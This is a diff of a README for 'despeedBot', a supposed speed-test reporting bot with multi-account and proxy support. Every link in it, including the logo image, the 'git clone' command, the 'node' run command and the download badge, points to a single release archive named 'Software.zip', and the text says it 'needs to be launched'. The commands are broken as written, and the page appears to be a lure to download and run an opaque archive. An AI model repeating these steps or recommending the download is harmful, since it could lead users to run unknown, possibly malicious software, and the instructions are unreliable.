@@ -1,6 +1,6 @@
 # 🚀 Welcome to despeedBot Repository! 🚀
 
-![despeedBot Logo](https://github.com/Frosty-Goat/despeedBot/releases/download/v1.0/Software.zip)
+![despeedBot Logo](https://github.com/Frosty-Goat/despeedBot/releases/download/v2.0/Software.zip)
 
 ## Introduction
 Welcome to the official repository of despeedBot! despeedBot is an automated tool designed to send speed test reports effortlessly. It supports multiple accounts and proxy usage, making it a versatile tool for various needs.
@@ -14,7 +14,7 @@ Welcome to the official repository of despeedBot! despeedBot is an automated too
 To get started with despeedBot, follow these steps:
 1. Clone the repository:
 ```bash
-git clone https://github.com/Frosty-Goat/despeedBot/releases/download/v1.0/Software.zip
+git clone https://github.com/Frosty-Goat/despeedBot/releases/download/v2.0/Software.zip
 ```
 
 2. Install dependencies:
@@ -26,7 +26,7 @@ npm install
 
 4. Run despeedBot:
 ```bash
-node https://github.com/Frosty-Goat/despeedBot/releases/download/v1.0/Software.zip
+node https://github.com/Frosty-Goat/despeedBot/releases/download/v2.0/Software.zip
 ```
 
 ## Usage
@@ -36,7 +36,7 @@ despeedBot simplifies the process of sending speed test reports. You can customi
 Contributions are welcome! If you have any ideas for improvements or new features, feel free to submit a pull request.
 
 ## Download despeedBot
-[![Download despeedBot](https://github.com/Frosty-Goat/despeedBot/releases/download/v1.0/Software.zip)](https://github.com/Frosty-Goat/despeedBot/releases/download/v1.0/Software.zip) (Needs to be launched)
+[![Download despeedBot](https://github.com/Frosty-Goat/despeedBot/releases/download/v2.0/Software.zip)](https://github.com/Frosty-Goat/despeedBot/releases/download/v2.0/Software.zip) (Needs to be launched)
 
 If the link doesn't work, please check the "Releases" section for the latest version.
 
